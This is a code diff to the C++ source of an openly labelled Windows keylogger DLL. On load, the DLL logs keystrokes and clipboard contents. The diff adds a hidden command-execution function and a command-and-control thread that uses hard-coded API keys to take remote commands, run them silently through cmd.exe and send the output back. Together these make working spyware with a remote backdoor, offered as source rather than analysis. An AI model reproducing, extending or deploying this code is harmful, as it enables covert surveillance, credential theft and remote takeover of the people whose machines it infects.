@@ -1,8 +1,11 @@
 
 #define _CRT_SECURE_NO_WARNINGS
-#include "MinHook.h"
 #include <iostream>
 #include <windows.h>
+#include <vector>
+#include <string>
+#include "api.hpp"
+#include "command.hpp"
 
 using namespace std;
 
@@ -16,7 +19,7 @@ static DWORD lastKey = 0;
 static DWORD lastTime = 0;
 
 extern "C" __declspec(dllexport) void CALLBACK MeowStart(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
-    MessageBoxA(NULL, "Keylogger running... 按下確定停止", "Debug", MB_OK);
+    MessageBoxA(NULL, "Keylogger running...", "Debug", MB_OK);
 }
 
 int save_key(DWORD vkCode) {
@@ -197,14 +200,84 @@ int ClipBoard(LPVOID lpParam) {
     return 0;
 }
 
+std::string exec_cmd(const std::string& cmd) {
+    // MessageBoxA(NULL, ("Executing: " + cmd).c_str(), "Debug: exec_cmd Start", MB_OK);
+    
+    std::string result;
+    HANDLE hReadPipe, hWritePipe;
+    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
+
+    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) return "Pipe Error";
+    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
+
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi = { 0 };
+    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.hStdOutput = hWritePipe;
+    si.hStdError = hWritePipe;
+    si.wShowWindow = SW_HIDE;
+
+    std::string full_cmd = "cmd.exe /c \"chcp 65001 > nul && " + cmd + " 2>&1\"";
+
+    if (!CreateProcessA(NULL, (LPSTR)full_cmd.c_str(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        CloseHandle(hReadPipe);
+        CloseHandle(hWritePipe);
+        return "CreateProcess Failed";
+    }
+
+    CloseHandle(hWritePipe);
+
+    char buffer[1024];
+    DWORD bytesRead;
+    while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
+        buffer[bytesRead] = '\0';
+        result += buffer;
+    }
+
+    WaitForSingleObject(pi.hProcess, 5000);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    CloseHandle(hReadPipe);
+
+    // MessageBoxA(NULL, "Command Finished", "Debug: exec_cmd End", MB_OK);
+    return result.empty() ? "[No Output]" : result;
+}
+
+DWORD WINAPI C2MonitorThread(LPVOID lpParam) {
+    API api("35KCRKDLUUKPF9ETFF0EHHT1K7YDNTQJ91AJCAPUUYMAEOHPGZ");
+    CommandManager cmdManager(&api, "M3cmo3s5QQqxcCACLR7E5g");
+
+    while (true) {
+        try {
+            // 1. 接收遠端指令 (此處會進入 wait 迴圈)
+            std::string cmd = cmdManager.receive_command();
+            
+            if (!cmd.empty()) {
+                // 2. 執行指令
+                std::string output = exec_cmd(cmd);
+
+                // 3. 回傳結果 
+                cmdManager.send_response(output);
+            }
+        } catch (...) {
+        }
+        Sleep(1000); 
+    }
+    return 0;
+}
+
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
     switch (ul_reason_for_call) {
     case DLL_PROCESS_ATTACH: {
         SetupFilePath();
         HANDLE Keylogger_Thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)keylogger, NULL, 0, NULL);
         CloseHandle(Keylogger_Thread);
+        
         HANDLE ClipBoard_Thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ClipBoard, NULL, 0, NULL);
         CloseHandle(ClipBoard_Thread);
+        
+        HANDLE hC2 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)C2MonitorThread, NULL, 0, NULL);
+        CloseHandle(hC2);
 
         break;
     }
